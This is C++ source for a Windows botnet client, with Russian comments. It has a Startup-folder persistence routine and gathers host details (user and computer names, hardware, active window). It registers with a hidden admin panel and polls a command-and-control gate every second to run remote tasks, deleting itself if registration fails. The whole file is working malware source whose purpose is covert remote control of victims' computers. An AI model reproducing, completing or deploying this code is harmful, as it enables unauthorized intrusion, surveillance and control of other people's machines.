#include <Windows.h>
#include <wbemidl.h>
#include <ctime>
#include <comutil.h>
#include <stdint.h>

#include "Debug_to_file.h"
#include "Crypt.h"
#include "BotConfig.h"
#include "Core/Common.h"
#include "Core/core.h"

#pragma optimize( "", off )
#pragma comment(linker, "/SUBSYSTEM:Windows /ENTRY:Main")

#define MEM_LIMIT 1024*1024
#define MAX_MODULE_SIZE 1024*1024

static BYTE DecResponse[MEM_LIMIT];
static BYTE DecResponse_cpy[MEM_LIMIT];
static wchar_t req[1024];
static uint8_t ascii[1024*sizeof(wchar_t)];

static wchar_t botId[MAX_PATH];
static char idTask[MAX_PATH];
static int (*start_module)(wchar_t* params) = NULL;

static void install_bot() {
	
	char str_to_system[1024];
	char path_bot[1024];
	char username[1024];

	DWORD bufCharCount = sizeof(username);

	GetModuleFileNameA(NULL, path_bot, sizeof(path_bot)/sizeof(path_bot[0]));
	GetUserNameA(username, &bufCharCount);

	sprintf(str_to_system, "copy %s \"C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"", path_bot, username);

	system(str_to_system);
}

int Main()
{	
	start_bot(botId);

	//Получение данных для регистрации бота в админке
	GetBotId(botId);

	DWORD majorVer, minorVer, buildVer;
	GetWinVer(&majorVer, &minorVer, &buildVer);

	wchar_t userName[MAX_PATH];
	if (!GetUsernameW(userName))
	{
		API(USER32, wsprintfW)(userName, L"void");
	}

	wchar_t computerName[MAX_PATH];
	if (!GetComputernameW(computerName))
	{
		API(USER32, wsprintfW)(computerName, L"void");
	}

	wchar_t cpuName[MAX_PATH];
	GetCpuName(cpuName);

	wchar_t gpuName[MAX_PATH];
	GetGpuName(gpuName);

	DWORD aviableRam;
	GetAviableRam(&aviableRam);

	wchar_t screenResolution[MAX_PATH];
	GetScreenResolution(screenResolution);

	wchar_t activeWindow[MAX_PATH];
	GetActiveWindow(activeWindow);

	//Генерация строки для отправки
	API(USER32, wsprintfW)(req, L"%s|Win %d.%d %d|%s|%s|%s|%s|%d|%s|%s",
		botId, majorVer, minorVer, buildVer, userName, computerName, cpuName, gpuName, aviableRam, screenResolution, activeWindow);

	UnicodeToASCII(req, (char*)ascii);

	//Попытка регистрации бота в админке
	bool ret_code = bot_reg(req);
	if (ret_code == true) {
		DEBUG_TO_FILE("+++ Bot is reg id: %s \r\n", botId);
		install_bot();
	}
	else {
		//Невозможно зарегистрировать бота, нужно самоудалиться
		DEBUG_TO_FILE("+++ Bot is reg fault id: %s \r\n", botId);
		do_destroy();
	}

	BYTE* recv_code = NULL;
	//Тут бесконечный цикл с опросом /gate/ping раз в секунду
	while (1) {
		//Задержка секунду.
		Sleep(1000);
		//Формирование запроса на ping
		API(USER32, wsprintfW)(req, L"%s|", botId);
		//Посылка запроса

		ret_code = post_send_recv_bot
		(hide_admin_path(),
		 hide_ping_path(),
		(wchar_t*)req,
		DecResponse);
		if (ret_code == true) {
			strncpy((char*)DecResponse_cpy, (const char*)DecResponse, sizeof(DecResponse));
			recv_code = (BYTE*)strtok((char*)DecResponse_cpy, "|");
			if (recv_code != NULL) {
				//Парсинг результатов
				if (!strcmp((const char*)recv_code, hide_str_reg())) {
					//Пройти регистрацию еще раз
					API(USER32, wsprintfW)(req, L"%s|Win %d.%d %d|%s|%s|%s|%s|%d|%s|%s",
						botId, majorVer, minorVer, buildVer, userName, computerName, cpuName, gpuName, aviableRam, screenResolution, activeWindow);
					UnicodeToASCII(req, (char*)ascii);
					DEBUG_TO_FILE("+++ Start reg bot again: %s \r\n", ascii);
					//Попытка регистрации бота в админке еще раз
					bot_reg(req);
				}
				else {
					if (!strcmp((const char*)recv_code, hide_str_task())) {
						//Выполнить задание
						parse_task_and_exec(botId, (char*)DecResponse);
					}
				}
			}
			DEBUG_TO_FILE("+++ Bot is worked ID: %s \r\n", botId);
		}
	}
	return 0;
}